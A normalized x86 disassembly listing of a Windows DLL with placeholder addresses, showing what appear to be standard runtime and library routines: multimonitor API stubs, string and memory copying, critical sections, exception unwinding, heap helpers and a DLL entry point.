push edi
je r-xdata
push r--data
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_10003a41
push esi
push edi
call sub_10003969
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_10003a97
push ebp
mov ebp esp
sub esp 0x2c
call sub_10003969
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10003a41
jmp r-xdata
test eax eax
je r-xdata
sub_10003b02
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_10003969
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_10003bd1
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0xc ] 0x0
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x10 ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x8
sub_10003c0d
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
push edi
call [ EnterCriticalSection@IAT ]
mov ecx [ esi + 0x8 ]
call sub_10013296
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
push edi
call [ LeaveCriticalSection@IAT ]
pop edi
pop esi
retn
sub_10003c35
mov eax sub_10019c24
call sub_10004904
sub esp 0xc
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov edi [ esi + 0xc ]
push ebx
mov eax [ edi ]
mov [ esi + 0xc ] eax
call [ LeaveCriticalSection@IAT ]
mov ecx [ ebp - 0xc ]
mov eax edi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
push [ esi ]
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x8 ]
push [ esi + 0x4 ]
push eax
call sub_10013276
mov ecx [ esi + 0x4 ]
dec ecx
mov edx ecx
imul edx [ esi ]
test ecx ecx
lea eax [ edx + eax + 0x4 ]
jl r-xdata
inc ecx
mov edx [ esi + 0xc ]
mov [ eax ] edx
mov [ esi + 0xc ] eax
sub eax [ esi ]
dec ecx
jne r-xdata
sub_10003cc4
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
retn 0x4
push ebx
lea ebx [ esi + 0x10 ]
push ebx
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0xc ]
push ebx
mov [ edi ] eax
mov [ esi + 0xc ] edi
call [ LeaveCriticalSection@IAT ]
pop ebx
sub_10003e54
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_10003e79
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_10003ecd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_10003f20
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_1000401e
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_10005f2d
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_10005e15
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_10004070
push [ esp + 0x4 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
retn
push eax
call sub_10004f15
pop ecx
or eax 0xffffffff
retn
test eax eax
je r-xdata
sub_1000409a
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
call sub_100067bc
push 0x8
mov [ ebp + 0xc ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x20 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
mov bl 0x1
movzx ecx dl
mov eax ecx
and ecx edi
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x20 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov al [ edx ]
push 0x1
movzx esi al
mov ecx esi
pop ebx
and ecx edi
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl bl
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x18 ]
mov ebx edx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
and eax ebx
pop ebx
leave
retn
movzx esi al
mov ecx esi
push 0x1
and ecx edi
pop eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl al
jne r-xdata
inc edx
jmp r-xdata
and [ edx ] 0x0
inc edx
inc edx
jmp r-xdata
mov al [ edx ]
test al al
je r-xdata
sub_1000413e
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x9
call sub_10006a09
push esi
call sub_10006abd
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_10006a6a
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push esi
push eax
call sub_10006ae8
push 0x9
call sub_10006a6a
add esp 0xc
pop esi
retn
sub_10004190
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_100041bf
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_1000767a
push esi
call sub_100041f0
push esi
mov edi eax
call sub_100076cc
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_100041f0
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_10007886
push esi
mov edi eax
call sub_100077fe
push [ esi + 0x10 ]
call sub_1000771e
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_1000413e
and [ esi + 0x1c ] 0x0
pop ecx
sub_1000423c
push esi
call sub_10007aff
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_1000798f
push esi
mov edi eax
call sub_100076cc
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_10004280
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_100042c2
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_10004311
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10007bc7
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_10004347
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_1000439b
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_100083e0
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1000439b
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_10007bc7
add esp 0x20
pop ebp
retn
sub_100043c0
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_10004476
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_100067bc
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_10004476
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_10007bc7
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_100042c2
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100044eb
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_1000848d
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_1000848d
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_10004568
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100045aa
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_10004588
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000463e
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10004656
mov eax [ esp + 0x8 ]
cmp eax 0x1
jne r-xdata
xor ecx ecx
cmp eax ecx
jne r-xdata
call [ GetVersion@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_100068c3
test eax eax
pop ecx
je r-xdata
cmp eax 0x3
jne r-xdata
cmp [ rw-data ] ecx
jle r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
and eax 0xff
shr [ rw-data ] 0x10
mov [ rw-data ] eax
mov [ rw-data ] ecx
shl eax 0x8
add eax ecx
mov [ rw-data ] eax
call sub_10006737
test eax eax
jne r-xdata
push 0x1
pop eax
push ecx
call sub_10006823
pop ecx
dec [ rw-data ]
cmp [ rw-data ] ecx
jne r-xdata
retn 0xc
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_100089f9
mov [ rw-data ] eax
call sub_100084e3
call sub_100087ac
call sub_100086f3
call sub_100059a9
inc [ rw-data ]
jmp r-xdata
call sub_100068ff
call sub_1000869f
call sub_1000678b
call sub_100068ff
jmp r-xdata
call sub_100059f8
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10004656
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_100036f8
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10004656
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10004656
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_100047cc
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
call sub_10008b2b
test eax eax
jne r-xdata
push [ esp + 0x4 ]
call sub_10008b64
push 0xff
call [ rw-data ]
pop ecx
pop ecx
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_100047ff
push esi
call sub_10005aac
push [ rw-data ]
call sub_10004a5e
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_10004a5e
add eax 0x10
push eax
push [ rw-data ]
call sub_10008cb7
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_10005ab5
mov eax esi
pop esi
retn
sub_1000488f
push 0x80
call sub_100049d2
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_100047cc
mov eax [ rw-data ]
pop ecx
sub_100048be
push esi
mov esi ecx
push 0x1b
mov [ esi ] r--data
call sub_10006a09
mov esi [ esi + 0x4 ]
pop ecx
test esi esi
je r-xdata
push 0x1b
call sub_10006a6a
pop ecx
pop esi
retn
push esi
call sub_1000413e
pop ecx
sub_10004940
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_10004998
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
pop edi
pop esi
leave
retn 0x8
sub_100049e4
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_10004a10
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_10009048
test eax eax
pop ecx
jne r-xdata
sub_10004a10
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
test esi esi
jne r-xdata
push 0x9
call sub_10006a09
push esi
call sub_10006e13
push 0x9
mov edi eax
call sub_10006a6a
add esp 0xc
test edi edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_10004a5e
push esi
push 0x9
call sub_10006a09
mov esi [ esp + 0xc ]
push esi
call sub_10006abd
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_10006a6a
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
mov esi [ esi - 0x4 ]
push 0x9
sub esi 0x9
call sub_10006a6a
pop ecx
jmp r-xdata
mov eax esi
pop esi
retn
sub_10004aa3
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push ebx
push esi
jne r-xdata
push 0x19
call sub_10006a09
mov esi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10009080
pop ecx
pop ecx
jmp r-xdata
push 0x19
call sub_10006a6a
mov eax [ ebp + 0xc ]
pop ecx
movzx ecx bx
sub eax ecx
neg eax
sbb eax eax
not eax
and eax esi
movzx eax bl
test [ eax + rw-data ] 0x4
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx eax bx
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
je r-xdata
inc esi
jmp r-xdata
push 0x19
call sub_10006a6a
pop ecx
xor eax eax
jmp r-xdata
movzx ecx bx
movzx eax al
shl ecx 0x8
or ecx eax
cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_10006a6a
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_10004b3a
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_10009230
inc eax
push eax
call sub_100049d2
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_10009140
pop ecx
pop ecx
pop esi
retn
sub_10004b65
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push edi
push 0x19
call sub_10006a09
pop ecx
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100092b0
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] eax
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
pop esi
pop ebp
retn
inc ecx
test dl dl
jne r-xdata
mov esi ecx
test esi esi
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + rw-data ] 0x4
je r-xdata
push 0x19
call sub_10006a6a
pop ecx
mov eax esi
pop edi
jne r-xdata
lea esi [ ecx - 0x1 ]
jmp r-xdata
sub_10004be0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10004c40 ]
jmp [ ecx * 4 + jump_table_10004cbc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10004d28 ]
mov eax edi
mov edx 0x3
